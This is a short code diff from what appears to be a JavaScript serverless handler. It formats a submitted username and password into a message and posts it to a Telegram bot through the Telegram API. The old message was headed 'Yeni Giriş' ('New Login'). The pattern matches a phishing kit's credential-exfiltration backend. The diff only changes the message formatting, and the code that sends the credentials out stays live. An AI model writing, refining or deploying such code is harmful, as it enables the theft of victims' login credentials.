@@ -12,7 +12,7 @@ export default async function handler(req, res) {
     return res.status(500).json({ message: "Environment variables eksik." });
   }
 
-  const text = `📥 Yeni Giriş\\n👤 Kullanıcı Adı: ${username}\\n🔐 Şifre: ${password}`;
+  const text = `👤 Kullanıcı Adı: ${username}🔐 Şifre: ${password}`;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
